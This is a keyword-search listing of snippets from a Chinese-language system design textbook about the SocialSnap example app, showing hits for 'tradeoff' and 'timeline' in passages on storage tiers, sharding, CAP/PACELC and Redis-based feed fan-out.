  c10_b10.md: ...）   冷归档 | ↑↑↑ 分钟-小时 | ↔ | ↑（持久） | ↓（托管服务）    核心主题就是巨大的成本-延迟 tradeoff（权衡）：更快存储每字节更贵。了解这个 tradeoff（权衡）后，你可以设计分层存储架构——热数据放 DRAM，温数据...
  c10_b10.md: ...持久） | ↓（托管服务）    核心主题就是巨大的成本-延迟 tradeoff（权衡）：更快存储每字节更贵。了解这个 tradeoff（权衡）后，你可以设计分层存储架构——热数据放 DRAM，温数据放 SSD，冷数据放对象存储，归档数据放磁带/Glaci...
  c10_b12.md: ...shard 间分布更均匀。这正是把一致性哈希洞察应用于对象存储层面：均匀散布 key，使没有单个节点成为瓶颈。存储层级 tradeoff（权衡）在这里也适用——分布不佳的 key 空间即使在“无限可扩展”的对象存储服务中，也会在规模上造成性能悬崖。...
  c10_b19.md: ...用性）复制实现十一个 9 持久性。代价是延迟——分布本质上是网络受限的。  存储系统的权衡矩阵项捕捉了巨大的成本-延迟 tradeoff（权衡）：更快存储每字节更贵，更慢存储更便宜。分层存储架构同时使用多层，让热数据快、冷数据便宜。  在第 11 章，我们...
  c11_b10.md: ...撤销） | ↑（无会话存储依赖） | ↑（密钥管理、refresh token 流程）  水平扩展这一行展示了本章核心 tradeoff（权衡）：可用性大幅提升、吞吐空间大幅增加，换取运维复杂度显著上升。无状态应用服务器本身运维简单；复杂度来自它们依赖的共...
  c11_b17.md: ...必须重新登录。数量通常非常小：只有在最后一次成功复制到主节点故障之间窄窗口内创建的会话。  对大多数应用，这是可接受的 tradeoff（权衡）。故障窗口是秒级；受影响会话数量极小；替代方案（同步复制，阻塞每次写入直到副本确认）会给每次登录增加延迟。Soc...
  c12_b01.md: ...收每个请求。只有一台应用服务器时它还能跟上，现在吞吐三倍，就跟不上了。  如何扩展数据库？答案比扩展应用服务器更微妙——tradeoff（权衡）也更尖锐。   ### 12.1 为什么数据库比应用服务器更难扩展  第 11 章扩展应用服务器时路径清晰：让它...
  c12_b04.md: ...扩展（分片）和水平读扩展（副本）。   #### 分片策略  如何决定哪些数据去哪个 shard？有三种主要策略，各有 tradeoff（权衡）。  **基于范围的分片（range-based sharding）** 根据 shard key 列的值范围分...
  c12_b05.md: ...要什么查询，并据此设计分片策略。一个能消除大多数跨分片查询的常见访问模式的 shard key，值得在其他地方付出显著 tradeoff（权衡）。...
  c12_b06.md: ...**反规范化**是在数据库 schema 中引入冗余，把相同数据存在多个地方，专门为了减少或消除 JOIN 需求的做法。tradeoff（权衡）是写复杂度增加（更新必须传播到所有副本），换取不需要 JOIN 的快速读。  plain 语言：不是维护一个权威...
  c12_b06.md: ...osts` 表可能被反规范化以直接包含作者用户名和头像 URL，消除获取帖子显示时与 `users` JOIN 的需求。tradeoff：如果用户修改用户名，应用必须在 `users` 表以及 `posts` 表中复制了用户名的每一行（可能是数百万行）都更...
  c12_b08.md: ...口。你写 `BEGIN; INSERT ...; UPDATE ...; COMMIT;`，数据库在幕后处理分布式协调。tradeoff（权衡）是延迟：分布式协调需要时间，所以 NewSQL 系统在简单操作上比单节点数据库慢。  对需要水平扩展和强事务保证...
  c12_b10.md: ...户 B”必须原子。账户 A 和账户 B 在不同 shard。解释两种无需完整 2PC 实现的不同处理思路，并说明各自的 tradeoff（权衡）。  提示  想想如果一步成功另一步失败会发生什么。有哪些补偿动作可行？  **答案：** 两种思路：  **思...
  c12_b10.md: ...key，幂等性）重试——贷记操作被设计为可安全重试多次。如果重试耗尽，发出补偿事务（冲正）撤销 Shard A 的扣款。tradeoff：在扣款成功和贷记成功之间的窗口，钱“在途”——已离开 A 但尚未到 B。这个中间状态必须正确处理，系统短暂可见。Sag...
  c12_b10.md: ...。如果贷记失败，托管被退回。托管记录充当本地锁，消除了跨 shard 原子协调的需求——每一步都是单 shard 操作。tradeoff：每笔转账操作更多（3 步而不是 2 步），托管记录必须小心管理以避免孤儿托管条目。  **Q3.** SocialSn...
  c12_b12.md: ...管理负担换来了另一种复杂度。  答案不是“所有人都该用 NewSQL”或“没人该用 NewSQL”——而是每个选择都有 tradeoff（权衡）。当你既需要 ACID 事务又需要水平扩展，且能容忍其延迟和运维复杂度时，NewSQL 合适。对工作负载读重（用...
  c13_b05.md: ...用性不依赖于服务 B 的可用性。** 如果服务 B 宕机，消息在队列中堆积，等 B 恢复后处理。服务 A 继续运行。  tradeoff（权衡）：异步通信意味着服务 A 不能立即得到服务 B 的结果。它是发后即忘。对结果不需要立即可用的操作（发送通知、生成...
  c14_b03.md: ...错性不可协商，真正的选择简化为分区期间的一致性 versus 可用性。这里我们把这个框架直接应用到复制决策，看看抽象的 tradeoff（权衡）如何在多节点数据存储的具体机制中体现。  2000 年，Eric Brewer 提出（后来正式证明）分布式系统的...
  c14_b08.md: ...#### 延迟与一致性 tradeoff（权衡）  如果欧洲用户向欧洲节点写入，而美国用户同时从美国节点读取，美国节点可能还没有欧洲写入——跨区域复制有数百毫秒...
  c14_b08.md: ...）（或 quorum）。欧洲写对欧洲读者强一致（他们命中同一区域节点），但欧洲写对美国读者要过一段时间才可见。  这个 tradeoff（权衡）编码在 Cassandra 的 `LOCAL_QUORUM` 一致性级别中：在本地区域内达到 quorum（快速...
  c14_b09.md: ...务 | 陈旧读；冲突解决复杂 | 社交数据；点赞数；缓存数据；非关键读 Quorum 读/写 | 一致性与性能之间可调 tradeoff（权衡） | 配置复杂；需要理解 N、R、W | 不同操作需要不同一致性级别的系统 跨区域复制 | 全球读延迟低；区域级...
  c14_b14.md: ...网络分区很罕见。单台服务器每年可能只遇到几次完整网络分区。对大多数实际部署，来自 CAP 的“分区期间 C vs. A”tradeoff（权衡） 可能从未在生产中触发。  然而，这个说法忽略了两个重要点：  第一，完整分区的罕见性并未消除更广泛的一致性与可...
  c14_b14.md: ...） 可能从未在生产中触发。  然而，这个说法忽略了两个重要点：  第一，完整分区的罕见性并未消除更广泛的一致性与可用性 tradeoff（权衡）。即使没有完整分区，**延迟可变性**也会造成同样困境。如果某个节点很慢（没宕，只是慢——网络拥塞、GC 暂停、...
  c14_b14.md: ...系统设计必须为最坏情况做计划，而不是平均情况。  更精确的表述（来自 Martin Kleppmann 的工作）：实际 tradeoff（权衡） 是**一致性 vs. 延迟**，由 PACELC 定理表达——分区（P）时选可用性（A）或一致性（C）；否则（...
  c14_b14.md: ...（P）时选可用性（A）或一致性（C）；否则（E），即使没有分区，也要选延迟（L）或一致性（C）。这种重新表述说明一致性 tradeoff（权衡） 始终存在，不只是分区期间。  **Q2.** 一个分布式数据库用向量时钟检测冲突，并把两个冲突版本都返回给应用...
  c14_b15.md: ...易推理。最终一致性——所有副本最终收敛——快速且高可用，但要求应用容忍陈旧读并处理写冲突。  CAP 定理形式化了这个 tradeoff（权衡）：网络分区期间，分布式系统必须选择一致性还是可用性。现代分布式数据库通过 quorum 读/写让这种选择可调——...
  c27_b06.md: ...金丝雀部署逐步转移流量。如果出错，立即回滚。  * * *   ### 27.3 权衡矩阵作为活文档  回忆第 2 章：Tradeoff Matrix 作为跨四个维度比较设计选择的工具被引入。全书过程中，每新增一个构建块、扩展模式和案例研究，我们都往矩阵里...
  c27_b06.md: ...计选择的工具被引入。全书过程中，每新增一个构建块、扩展模式和案例研究，我们都往矩阵里加行。  对 SocialSnap，Tradeoff Matrix 不是写一次就归档的文档。它是架构团队每次重大设计决策都更新的活工件。看它是如何演变的：  **v1（添加...
  c27_b06.md: ...——独立部署和团队 owning；需要分布式追踪；更高运营复杂度。”  维护这个矩阵的力量：新工程师加入团队时，可以读 Tradeoff Matrix，不仅理解决策是什么，还理解决策为什么做。矩阵捕获推理，而不仅仅是结论。  到第 26 章，SocialS...
  c27_b06.md: ...x，不仅理解决策是什么，还理解决策为什么做。矩阵捕获推理，而不仅仅是结论。  到第 26 章，SocialSnap 的 Tradeoff Matrix 已有数十行。第 28 章呈现完整版——全书完整参考卡。  * * *...
  c27_b11.md: ...立即重定向所有流量。开关变更通过 gossip（第 26 章）在 10 秒内传播到所有路由节点。  **Q3.** 从 Tradeoff Matrix 视角审视 SocialSnap 演进。在每次主要版本变更（v1 到 v7）中，找出一个设计决策、它做出的...
  intro.md: ...，要么把你淹没在学院派的分布式系统理论里。本书做的是更罕见的事：它教你如何思考系统——在动手设计之前该问什么问题，哪些 tradeoff（权衡）始终在场，以及为什么看似随意的选择一旦理解了约束，就会发现其实经过深思熟虑。  主线是 SocialSnap，一...
  intro.md: ...p 做过的每一个架构决策时，你已经和这些决策共处了数百页——它们会显得来之不易，而非抽象空洞。  另外两条线索贯穿全书。Tradeoff Matrix（权衡矩阵）在第 2 章以一个简单的三列表格引入，每做一个重大架构决策就增加一行。到第 28 章，它已成为...
  intro.md: ...，要么把你淹没在学院派的分布式系统理论里。本书做的是更罕见的事：它教你如何思考系统——在动手设计之前该问什么问题，哪些 tradeoff（权衡）始终在场，以及为什么看似随意的选择一旦理解了约束，就会发现其实经过深思熟虑。  主线是 SocialSnap，一...
  intro.md: ...p 做过的每一个架构决策时，你已经和这些决策共处了数百页——它们会显得来之不易，而非抽象空洞。  另外两条线索贯穿全书。Tradeoff Matrix（权衡矩阵）在第 2 章以一个简单的三列表格引入，每做一个重大架构决策就增加一行。到第 28 章，它已成为...

=== timeline (111 occurrences) ===
  c22_b02.md: ...时：  1. U 的帖子写入数据库 2. 系统查找 U 的全部 N 个关注者 3. 系统把 P 插入每个关注者的 **timeline 缓存** —— 一个预计算的、用户专属的内存 feed  关注者 F 请求 feed 时：  1. 读取 F 的 ti...
  c22_b02.md: ...ne 缓存** —— 一个预计算的、用户专属的内存 feed  关注者 F 请求 feed 时：  1. 读取 F 的 timeline 缓存——feed 已计算好 2. 立即返回：O(1) 延迟，极快  这就是 **push 模型**：帖子在写入时被推入...
  c22_b02.md: ...型**：帖子在写入时被推入关注者的 feed。每次写入“扇出”到 N 个位置。  **优点：** feed 读取极快——timeline 已预计算并在内存中。读取时没有复杂查询。  **缺点：** 1000 万（10 million）关注者的用户写操作需要...
  c22_b02.md: ...n）次写入。对拥有数千高关注者用户且频繁发帖的平台，这一扇出成本高得惊人。此外，如果用户偏好或排序算法改变，所有预计算 timeline 都会变陈旧，必须重新生成。   #### 读时扇出（Pull 模型）  用户 U 创建帖子 P 时：  1. U 的帖...
  c22_b03.md: ...者 < 阈值，例如 100 万），对名人用读时扇出（关注者 ≥ 阈值）。feed 由两个来源组装：  1. **预计算 timeline**（被关注的普通用户的写时扇出结果） 2. **按需获取的名人帖子**（读取时从名人最近帖子列表获取）  最终 fee...
  c22_b03.md: ...读取时合并高效：为我关注的每个名人获取最近帖子是小而快的操作（可能 5 位名人，每位都有缓存的最近帖子列表）。预计算 timeline 已在内存中。合并是按时间戳对有序列表做简单 k-way 合并，再重新排序——约 10ms 计算。  阈值（100 万关...
  c22_b03.md: ...合并，再重新排序——约 10ms 计算。  阈值（100 万关注者）是可调参数。设太低会把太多用户划入名人，降低预计算 timeline 效果。设太高会让 99.9 万（999,000）关注者的用户扇出到 99.9 万（999,000）个地方——昂贵但可容...
  c22_b04.md: ...户做特殊处理。精确阈值不如拥有该机制重要。工程实现良好的系统可根据观察到的写入成本动态调整阈值。   ### 22.3 Timeline 存储——预计算 Feed 存在哪里  对写时扇出路径，每个用户有一个 **timeline** —— 预计算的、属于其...
  c22_b04.md: ...值。   ### 22.3 Timeline 存储——预计算 Feed 存在哪里  对写时扇出路径，每个用户有一个 **timeline** —— 预计算的、属于其 feed 的帖子 ID 列表。   #### Timeline 里存什么？  Timeli...
  c22_b04.md: ...出路径，每个用户有一个 **timeline** —— 预计算的、属于其 feed 的帖子 ID 列表。   #### Timeline 里存什么？  Timeline 应存最少数据：仅帖子 ID（每个 8 字节）和排序分数（每个 4 字节）。完整帖子内容...
  c22_b04.md: ...meline** —— 预计算的、属于其 feed 的帖子 ID 列表。   #### Timeline 里存什么？  Timeline 应存最少数据：仅帖子 ID（每个 8 字节）和排序分数（每个 4 字节）。完整帖子内容在 feed 渲染时从帖子数据库...
  c22_b04.md: ...和排序分数（每个 4 字节）。完整帖子内容在 feed 渲染时从帖子数据库或缓存获取。这种分离有两个好处：  1. **Timeline 内存效率：** 存帖子 ID 而非帖子内容，可把 timeline 存储降低 100-1000 倍。为 5000 万（...
  c22_b04.md: ...数据库或缓存获取。这种分离有两个好处：  1. **Timeline 内存效率：** 存帖子 ID 而非帖子内容，可把 timeline 存储降低 100-1000 倍。为 5000 万（50 million）用户每人存 1000 个帖子 ID：50,00...
  c22_b04.md: ...ID：50,000,000 × 1000 × 12 字节 = 600 GB——可放入大型 Redis 集群。 2. **Timeline 一致性：** 帖子更新（编辑）或删除时，只需在一个地方更新（帖子数据库）。timeline 存储的帖子 ID 始终指向...
  c22_b04.md: ...edis 集群。 2. **Timeline 一致性：** 帖子更新（编辑）或删除时，只需在一个地方更新（帖子数据库）。timeline 存储的帖子 ID 始终指向当前版本。如果 timeline 存帖子内容，帖子更新后必须跨所有 timeline 更新每...
  c22_b04.md: ...帖子更新（编辑）或删除时，只需在一个地方更新（帖子数据库）。timeline 存储的帖子 ID 始终指向当前版本。如果 timeline 存帖子内容，帖子更新后必须跨所有 timeline 更新每一份副本——不可管理的失效问题。   #### Timeli...
  c22_b04.md: ...据库）。timeline 存储的帖子 ID 始终指向当前版本。如果 timeline 存帖子内容，帖子更新后必须跨所有 timeline 更新每一份副本——不可管理的失效问题。   #### Timeline 作为有序列表  Timeline 是按排序分数...
  c22_b04.md: ...meline 存帖子内容，帖子更新后必须跨所有 timeline 更新每一份副本——不可管理的失效问题。   #### Timeline 作为有序列表  Timeline 是按排序分数排序的帖子 ID 有序列表。Redis sorted set 非常合适：...
  c22_b04.md: ...后必须跨所有 timeline 更新每一份副本——不可管理的失效问题。   #### Timeline 作为有序列表  Timeline 是按排序分数排序的帖子 ID 有序列表。Redis sorted set 非常合适：`user:F:timeline`...
  c22_b04.md: ...Timeline 是按排序分数排序的帖子 ID 有序列表。Redis sorted set 非常合适：`user:F:timeline` 是一个 sorted set，每个 member 是 `post_id`，score 是排序分数。Feed 获取即...
  c22_b04.md: ...r 是 `post_id`，score 是排序分数。Feed 获取即 `ZREVRANGEBYSCORE user:F:timeline +inf -inf LIMIT 0 20` —— 分数最高的 20 条帖子。  写时扇出：用户 U 发帖 P 时，系统...
  c22_b04.md: ...写时扇出：用户 U 发帖 P 时，系统把 P 加入每个关注者 F 的 sorted set：`ZADD user:F:timeline <ranking_score> <post_id>`。插入后，若 sorted set 超过最大大小（如 5000 条...
  c22_b04.md: ...sorted set 超过最大大小（如 5000 条），删除最低分条目：`ZREMRANGEBYRANK user:F:timeline 0 -(max_size+1)`。  最大大小决定预计算 timeline 能回溯多远。每个被关注用户平均每天 5 条...
  c22_b04.md: ...REMRANGEBYRANK user:F:timeline 0 -(max_size+1)`。  最大大小决定预计算 timeline 能回溯多远。每个被关注用户平均每天 5 条帖子的 5000 条，可覆盖 1 位关注者 1000 天历史——远超需要。实...
  c22_b04.md: ...户做特殊处理。精确阈值不如拥有该机制重要。工程实现良好的系统可根据观察到的写入成本动态调整阈值。   ### 22.3 Timeline 存储——预计算 Feed 存在哪里  对写时扇出路径，每个用户有一个 **timeline** —— 预计算的、属于其...
  c22_b04.md: ...值。   ### 22.3 Timeline 存储——预计算 Feed 存在哪里  对写时扇出路径，每个用户有一个 **timeline** —— 预计算的、属于其 feed 的帖子 ID 列表。   #### Timeline 里存什么？  Timeli...
  c22_b04.md: ...出路径，每个用户有一个 **timeline** —— 预计算的、属于其 feed 的帖子 ID 列表。   #### Timeline 里存什么？  Timeline 应存最少数据：仅帖子 ID（每个 8 字节）和排序分数（每个 4 字节）。完整帖子内容...
  c22_b04.md: ...meline** —— 预计算的、属于其 feed 的帖子 ID 列表。   #### Timeline 里存什么？  Timeline 应存最少数据：仅帖子 ID（每个 8 字节）和排序分数（每个 4 字节）。完整帖子内容在 feed 渲染时从帖子数据库...
  c22_b04.md: ...和排序分数（每个 4 字节）。完整帖子内容在 feed 渲染时从帖子数据库或缓存获取。这种分离有两个好处：  1. **Timeline 内存效率：** 存帖子 ID 而非帖子内容，可把 timeline 存储降低 100-1000 倍。为 5000 万（...
  c22_b04.md: ...数据库或缓存获取。这种分离有两个好处：  1. **Timeline 内存效率：** 存帖子 ID 而非帖子内容，可把 timeline 存储降低 100-1000 倍。为 5000 万（50 million）用户每人存 1000 个帖子 ID：50,00...
  c22_b04.md: ...ID：50,000,000 × 1000 × 12 字节 = 600 GB——可放入大型 Redis 集群。 2. **Timeline 一致性：** 帖子更新（编辑）或删除时，只需在一个地方更新（帖子数据库）。timeline 存储的帖子 ID 始终指向...
  c22_b04.md: ...edis 集群。 2. **Timeline 一致性：** 帖子更新（编辑）或删除时，只需在一个地方更新（帖子数据库）。timeline 存储的帖子 ID 始终指向当前版本。如果 timeline 存帖子内容，帖子更新后必须跨所有 timeline 更新每...
  c22_b04.md: ...帖子更新（编辑）或删除时，只需在一个地方更新（帖子数据库）。timeline 存储的帖子 ID 始终指向当前版本。如果 timeline 存帖子内容，帖子更新后必须跨所有 timeline 更新每一份副本——不可管理的失效问题。   #### Timeli...
  c22_b04.md: ...据库）。timeline 存储的帖子 ID 始终指向当前版本。如果 timeline 存帖子内容，帖子更新后必须跨所有 timeline 更新每一份副本——不可管理的失效问题。   #### Timeline 作为有序列表  Timeline 是按排序分数...
  c22_b04.md: ...meline 存帖子内容，帖子更新后必须跨所有 timeline 更新每一份副本——不可管理的失效问题。   #### Timeline 作为有序列表  Timeline 是按排序分数排序的帖子 ID 有序列表。Redis sorted set 非常合适：...
  c22_b04.md: ...后必须跨所有 timeline 更新每一份副本——不可管理的失效问题。   #### Timeline 作为有序列表  Timeline 是按排序分数排序的帖子 ID 有序列表。Redis sorted set 非常合适：`user:F:timeline`...
  c22_b04.md: ...Timeline 是按排序分数排序的帖子 ID 有序列表。Redis sorted set 非常合适：`user:F:timeline` 是一个 sorted set，每个 member 是 `post_id`，score 是排序分数。Feed 获取即...
  c22_b04.md: ...r 是 `post_id`，score 是排序分数。Feed 获取即 `ZREVRANGEBYSCORE user:F:timeline +inf -inf LIMIT 0 20` —— 分数最高的 20 条帖子。  写时扇出：用户 U 发帖 P 时，系统...
  c22_b04.md: ...写时扇出：用户 U 发帖 P 时，系统把 P 加入每个关注者 F 的 sorted set：`ZADD user:F:timeline <ranking_score> <post_id>`。插入后，若 sorted set 超过最大大小（如 5000 条...
  c22_b04.md: ...sorted set 超过最大大小（如 5000 条），删除最低分条目：`ZREMRANGEBYRANK user:F:timeline 0 -(max_size+1)`。  最大大小决定预计算 timeline 能回溯多远。每个被关注用户平均每天 5 条...
  c22_b04.md: ...REMRANGEBYRANK user:F:timeline 0 -(max_size+1)`。  最大大小决定预计算 timeline 能回溯多远。每个被关注用户平均每天 5 条帖子的 5000 条，可覆盖 1 位关注者 1000 天历史——远超需要。实...
  c22_b06.md: ...#### 排序分数何时计算？  这是关键架构决策：在写入时（帖子加入 timeline 时）计算分数，还是在读取时（用户请求 feed 时）？  **写时计分** 在帖子扇出时计算初始分数。实现简单，但分数...
  c22_b06.md: ...在读取时（用户请求 feed 时）？  **写时计分** 在帖子扇出时计算初始分数。实现简单，但分数可能陈旧：帖子加入 timeline 后若走红，其缓存分数无法反映新的质量信号。此外，亲密度信号是用户专属的——P 在 F 的 timeline 中的分数取...
  c22_b06.md: ...：帖子加入 timeline 后若走红，其缓存分数无法反映新的质量信号。此外，亲密度信号是用户专属的——P 在 F 的 timeline 中的分数取决于 F 与 U 的历史，这意味着写时按用户计分需要为每个关注者读取 F 的亲密度画像。  **读时计分**...
  c22_b06.md: ...读取 F 的亲密度画像。  **读时计分** 在用户请求 feed 时重新计算分数。给出最新分数。代价：每次请求可能对 timeline 中 1000+ 候选帖子做计分。500 万并发 feed 观看者时，每天 50 亿次计分——昂贵，但如果排序模型保持简...
  c22_b06.md: ...只用帖子内在质量信号，不用用户专属亲密度）。读时用用户专属亲密度信号对 top-N 候选重新排序。这减少读时计算：只给 timeline 中已按基础分排好序的前 100 个候选打完整模型分，而非对全部 1000 个打分。   ### 22.5 完整扇出架构...
  c22_b06.md: ...排序分（用 P 的新鲜度和发布后前 5 分钟的早期质量信号）    * 批量写入 Redis：`ZADD user:F:timeline <score> <post_id>` 对所有关注者 5. **修剪 oversized timeline：** 扇出后...
  c22_b06.md: ...user:F:timeline <score> <post_id>` 对所有关注者 5. **修剪 oversized timeline：** 扇出后，从超过最大大小（1000 条）的 timeline 中删除低分条目。...
  c22_b06.md: ...` 对所有关注者 5. **修剪 oversized timeline：** 扇出后，从超过最大大小（1000 条）的 timeline 中删除低分条目。...
  c22_b07.md: ...1. **用户 F 请求 feed：** `GET /feed` 到 Feed Service。 2. **获取预计算 timeline：** `ZREVRANGEBYSCORE user:F:timeline +inf -inf LIMIT 0 200`...
  c22_b07.md: ...ed Service。 2. **获取预计算 timeline：** `ZREVRANGEBYSCORE user:F:timeline +inf -inf LIMIT 0 200` —— 从 Redis 获取 F 的 timeline 中前 200 个帖...
  c22_b07.md: ...RE user:F:timeline +inf -inf LIMIT 0 200` —— 从 Redis 获取 F 的 timeline 中前 200 个帖子 ID。很快（Redis 中 O(log N + 200)，约 2ms）。 3. **识别名人关注...
  c22_b07.md: ....) ORDER BY created_at DESC LIMIT 20`。 4. **合并候选：** 把 200 个 timeline 帖子 ID 和名人帖子合并成约 220 个候选集合。 5. **获取帖子详情：** 对候选集合中每个帖子 ID，从 P...
  c22_b07.md: ...算最终排序分。按最终分数排序。 7. **返回前 20 条帖子** 给 F 的客户端。  该流程端到端延迟：Redis timeline 读取（2ms）+ 名人帖子获取（10ms，并行）+ 帖子内容缓存获取（5ms，并行批量）+ 重新排序（5ms）+ 序列...
  c22_b08.md: ...5 分钟后加载 feed 会看到它——但如果用户在名人发帖 1 分钟前加载了 feed，则要等刷新才能看到。这是预计算 timeline 固有的新鲜度限制。  **客户端刷新：** 客户端即使用户未主动互动，也会周期性刷新 feed（“下拉刷新”或每 60...
  c22_b09.md: ...全用户写时扇出 | 极高（每帖 N 次写入） | 极低（预计算） | 高（数秒） | 高（Fanout Service、timeline 管理） 全用户读时扇出 | 低（每帖 1 次写入） | 高（读取时 N 次查询） | 很高（始终新鲜） | 中 混合扇...
  c22_b09.md: ...N 次写入） | 低（预计算 + 小合并） | 高（在 SLO 内） | 高（名人检测、合并逻辑） 只存帖子 ID 的 timeline | 中存储（所有帖子 ID） | 低（小 fetch + 补水） | 高 | 中 timeline 存帖子内容 | 高...
  c22_b09.md: ...只存帖子 ID 的 timeline | 中存储（所有帖子 ID） | 低（小 fetch + 补水） | 高 | 中 timeline 存帖子内容 | 高存储（内容复制） | 极低（无需补水） | 中（编辑时陈旧） | 极高（失效） 读时重新排序 | 写...
  c22_b10.md: ...，并给出各自的主要优缺点。  **答案：** **写时扇出（push 模型）：** 帖子创建时立即写入所有关注者预计算 timeline。Feed 读取快，因为 timeline 已在内存中备好。缺点：写入成本高——有 N 个关注者的帖子需要 N 次 ti...
  c22_b10.md: ...* **写时扇出（push 模型）：** 帖子创建时立即写入所有关注者预计算 timeline。Feed 读取快，因为 timeline 已在内存中备好。缺点：写入成本高——有 N 个关注者的帖子需要 N 次 timeline 写入。对高关注者用户，这变得...
  c22_b10.md: ...ne。Feed 读取快，因为 timeline 已在内存中备好。缺点：写入成本高——有 N 个关注者的帖子需要 N 次 timeline 写入。对高关注者用户，这变得不可接受地昂贵。  **读时扇出（pull 模型）：** 帖子创建时只把帖子本身写入数据库...
  c22_b10.md: ...0 万（10 million）关注者的用户发一次帖并使用写时扇出，系统每帖执行 1000 万（10 million）次 timeline 写入。10 位这样的用户频繁发帖，每天产生数亿次扇出写入——主导系统写入容量。名人情况特殊，因为幂律分布意味着它只影响...
  c22_b10.md: ...扇出，改为读时获取他们的帖子，利用他们的帖子被缓存、可通过单次缓存读取服务数百万读者的特点。  **Q3.** 为什么 timeline 应该存帖子 ID 而非完整帖子内容？  **答案：** 两个原因：(1) 存储效率——存帖子 ID（每个 8 字节）而...
  c22_b10.md: ...答案：** 两个原因：(1) 存储效率——存帖子 ID（每个 8 字节）而非完整帖子内容（200–2000 字节）可把 timeline 存储降低 25–250 倍。对 5000 万（50 million）用户每人 1000 条 timeline 条目，差...
  c22_b10.md: ...节）可把 timeline 存储降低 25–250 倍。对 5000 万（50 million）用户每人 1000 条 timeline 条目，差别是 400 GB 对 400 TB——巨大成本差异。(2) 一致性——帖子编辑或删除时，只需更新一个记录（在...
  c22_b10.md: ...GB 对 400 TB——巨大成本差异。(2) 一致性——帖子编辑或删除时，只需更新一个记录（在帖子数据库中）。如果 timeline 存帖子内容，就要更新所有关注者 timeline 中的每一份副本，造成与第 7 章缓存失效问题相同的复杂失效问题。帖子...
  c22_b10.md: ...一致性——帖子编辑或删除时，只需更新一个记录（在帖子数据库中）。如果 timeline 存帖子内容，就要更新所有关注者 timeline 中的每一份副本，造成与第 7 章缓存失效问题相同的复杂失效问题。帖子 ID 是永久引用；它们指向的内容可以在一个地方更...
  c22_b12.md: ...有部分关注者应看到帖子时，扇出流程有什么变化。这如何影响每帖 Fanout Service 的工作量？会简化还是复杂化 timeline 设计？  **答案：** 扇出架构需要感知帖子可见性。关键变化：  **数据库变更：** 给 posts 增加 `vi...
  c22_b12.md: ...t_created` 事件时，Fanout Service 只获取作者的密友列表（不是所有关注者），并只写入这些用户的 timeline。  **对扇出成本的影响：** 密友帖子只扇出给 50 人，而非可能数千人。这比公开帖子便宜得多。5% 的密友专属帖子...
  c22_b12.md: ...* 密友帖子只扇出给 50 人，而非可能数千人。这比公开帖子便宜得多。5% 的密友专属帖子产生可忽略的扇出成本。  **Timeline 复杂度：** Timeline 必须处理混合可见性。如果用户 F 在用户 U 的密友列表中，F 的 timeline...
  c22_b12.md: ...而非可能数千人。这比公开帖子便宜得多。5% 的密友专属帖子产生可忽略的扇出成本。  **Timeline 复杂度：** Timeline 必须处理混合可见性。如果用户 F 在用户 U 的密友列表中，F 的 timeline 会同时包含密友帖子和公开帖子。渲...
  c22_b12.md: ...*Timeline 复杂度：** Timeline 必须处理混合可见性。如果用户 F 在用户 U 的密友列表中，F 的 timeline 会同时包含密友帖子和公开帖子。渲染 feed 时，Feed Service 直接返回 timeline 中的内容，无需...
  c22_b12.md: ...列表中，F 的 timeline 会同时包含密友帖子和公开帖子。渲染 feed 时，Feed Service 直接返回 timeline 中的内容，无需额外可见性过滤——可见性过滤已在扇出时完成。  **名人密友：** 如果名人（关注者 > 100 万阈值...
  c22_b12.md: ...user:F:latest_followed_activity`。Fanout Service 在把帖子扇出到 F 的 timeline 时更新它：`SET user:F:latest_followed_activity <post_timestamp>`...
  c22_b12.md: ...有部分关注者应看到帖子时，扇出流程有什么变化。这如何影响每帖 Fanout Service 的工作量？会简化还是复杂化 timeline 设计？  **答案：** 扇出架构需要感知帖子可见性。关键变化：  **数据库变更：** 给 posts 增加 `vi...
  c22_b12.md: ...t_created` 事件时，Fanout Service 只获取作者的密友列表（不是所有关注者），并只写入这些用户的 timeline。  **对扇出成本的影响：** 密友帖子只扇出给 50 人，而非可能数千人。这比公开帖子便宜得多。5% 的密友专属帖子...
  c22_b12.md: ...* 密友帖子只扇出给 50 人，而非可能数千人。这比公开帖子便宜得多。5% 的密友专属帖子产生可忽略的扇出成本。  **Timeline 复杂度：** Timeline 必须处理混合可见性。如果用户 F 在用户 U 的密友列表中，F 的 timeline...
  c22_b12.md: ...而非可能数千人。这比公开帖子便宜得多。5% 的密友专属帖子产生可忽略的扇出成本。  **Timeline 复杂度：** Timeline 必须处理混合可见性。如果用户 F 在用户 U 的密友列表中，F 的 timeline 会同时包含密友帖子和公开帖子。渲...
  c22_b12.md: ...*Timeline 复杂度：** Timeline 必须处理混合可见性。如果用户 F 在用户 U 的密友列表中，F 的 timeline 会同时包含密友帖子和公开帖子。渲染 feed 时，Feed Service 直接返回 timeline 中的内容，无需...
  c22_b12.md: ...列表中，F 的 timeline 会同时包含密友帖子和公开帖子。渲染 feed 时，Feed Service 直接返回 timeline 中的内容，无需额外可见性过滤——可见性过滤已在扇出时完成。  **名人密友：** 如果名人（关注者 > 100 万阈值...
  c22_b12.md: ...user:F:latest_followed_activity`。Fanout Service 在把帖子扇出到 F 的 timeline 时更新它：`SET user:F:latest_followed_activity <post_timestamp>`...
  c22_b14.md: ...#### 深入思考  **Q1.** 写时扇出方法在 Redis 中预计算 timeline。Redis 是内存存储——Redis 重启或故障时，所有这些预计算 timeline 会怎样？架构如何从冷 Redis...
  c22_b14.md: ...扇出方法在 Redis 中预计算 timeline。Redis 是内存存储——Redis 重启或故障时，所有这些预计算 timeline 会怎样？架构如何从冷 Redis 缓存恢复？  **讨论：** 这就是预热问题——Redis 故障后空启动，预计算 t...
  c22_b14.md: ...e 会怎样？架构如何从冷 Redis 缓存恢复？  **讨论：** 这就是预热问题——Redis 故障后空启动，预计算 timeline 消失。用户请求 feed 时缓存未命中，feed 组装回退到读时扇出——正是我们设计要避免的昂贵路径。对 500 万（...
  c22_b14.md: ...s 可配置持久化到磁盘（RDB 快照或 append-only log）。重启后 Redis 从快照重载。对频繁更新的 timeline 数据，每 60 秒 RDB 快照可能丢失最多 60 秒扇出写入。对 60 秒新鲜度 SLO，这是可接受的——恢复后用户...
  c22_b14.md: ...发数据库回退的冷未命中请求数。使用请求队列或限流器防止 500 万用户同时触发昂贵兜底查询。每个用户最初几个请求预热其 timeline；后续请求命中缓存。5–10 分钟内大多数活跃用户 timeline 被重新填充。  **从数据库预预热：** 后台进程...
